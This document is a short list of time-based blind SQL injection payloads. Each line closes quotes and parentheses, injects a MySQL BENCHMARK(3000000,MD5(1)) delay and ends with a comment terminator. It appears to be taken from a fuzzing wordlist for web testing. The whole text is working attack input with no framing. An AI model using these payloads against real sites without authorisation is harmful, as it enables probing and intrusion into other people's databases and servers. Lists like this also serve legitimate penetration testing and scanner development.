+"))) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20%23
